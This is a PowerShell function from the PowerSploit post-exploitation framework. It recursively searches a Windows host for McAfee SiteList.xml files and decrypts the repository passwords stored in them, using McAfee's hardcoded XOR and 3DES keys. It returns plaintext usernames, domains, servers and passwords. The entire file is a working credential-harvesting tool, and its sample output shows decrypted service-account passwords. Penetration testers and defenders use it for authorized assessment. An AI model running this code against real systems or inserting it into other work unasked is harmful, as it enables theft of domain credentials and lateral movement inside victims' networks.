function Get-SiteListPassword {
<#
    .SYNOPSIS

        Retrieves the plaintext passwords for found McAfee's SiteList.xml files.
        Based on Jerome Nokin (@funoverip)'s Python solution (in links).

        PowerSploit Function: Get-SiteListPassword
        Original Author: Jerome Nokin (@funoverip)
        PowerShell Port: @harmj0y
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .PARAMETER SiteListFilePath

        Optional path to a SiteList.xml file.

    .EXAMPLE
    
        PS C:\> Get-SiteListPassword

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    :
        Path        : Products/CommonUpdater
        Name        : McAfeeHttp
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  :
        Server      : update.nai.com:80

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    : McAfeeService
        Path        : Repository$
        Name        : Paris
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  : companydomain
        Server      : paris001

        EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
        UserName    : McAfeeService
        Path        : Repository$
        Name        : Tokyo
        DecPassword : MyStrongPassword!
        Enabled     : 1
        DomainName  : companydomain
        Server      : tokyo000

    .LINK
        https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
        https://funoverip.net/2016/02/mcafee-sitelist-xml-password-decryption/
        https://github.com/tfairane/HackStory/blob/master/McAfeePrivesc.md
#>

    [CmdletBinding()]
    param(
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $SiteListFilePath
    )

    function Get-DecryptedSitelistPassword {
        # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
        # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
        # port by @harmj0y
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $B64Pass
        )

        # make sure the appropriate assemblies are loaded
        Add-Type -assembly System.Security
        Add-Type -assembly System.Core

        # declare the encoding/crypto providers we need
        $Encoding = [System.Text.Encoding]::ASCII
        $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider 
        $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

        # static McAfee key XOR key LOL
        $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

        # xor the input b64 string with the static XOR key
        $I = 0;
        $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

        # build the static McAfee 3DES key TROLOL
        $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

        # set the options we need
        $3DES.Mode = 'ECB'
        $3DES.Padding = 'None'
        $3DES.Key = $3DESKey

        # decrypt the unXor'ed block
        $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

        # ignore the padding for the result
        $Index = [Array]::IndexOf($Decrypted, [Byte]0)
        if($Index -ne -1) {
            $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
        }
        else {
            $DecryptedPass = $Encoding.GetString($Decrypted)
        }

        New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
    }

    function Get-SitelistFields {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $True)]
            [String]
            $Path
        )

        try {
            [Xml]$SiteListXml = Get-Content -Path $Path

            if($SiteListXml.InnerXml -Like "*password*") {
                Write-Verbose "Potential password in found in $Path"

                $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {                    
                    try {
                        $PasswordRaw = $_.Password.'#Text'

                        if($_.Password.Encrypted -eq 1) {
                            # decrypt the base64 password if it's marked as encrypted
                            $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                        }
                        else {
                            $DecPassword = $PasswordRaw
                        }

                        $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
                        $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                        $ObjectProperties = @{
                            'Name' = $_.Name;
                            'Enabled' = $_.Enabled;
                            'Server' = $Server;
                            'Path' = $Path;
                            'DomainName' = $_.DomainName;
                            'UserName' = $_.UserName;
                            'EncPassword' = $PasswordRaw;
                            'DecPassword' = $DecPassword;
                        }
                        New-Object -TypeName PSObject -Property $ObjectProperties
                    }
                    catch {
                        Write-Debug "Error parsing node : $_"
                    }
                }
            }
        }
        catch {
            Write-Error $_
        }
    }

    if($SiteListFilePath) {
        $XmlFiles = Get-ChildItem -Path $SiteListFilePath
    }
    else {
        $XmlFiles = 'C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\' | Foreach-Object {
            Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue
        }
    }

    $XmlFiles | Where-Object { $_ } | Foreach-Object {
        Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
        Get-SitelistFields -Path $_.Fullname        
    }
}
